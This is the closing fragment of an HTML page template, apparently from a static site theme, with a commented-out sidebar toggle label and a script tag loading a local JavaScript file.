    </div>


    <!-- <label for="sidebar-checkbox" class="sidebar-toggle"></label> -->

    <script src='/public/js/script.js'></script>
 
  </body>
</html>
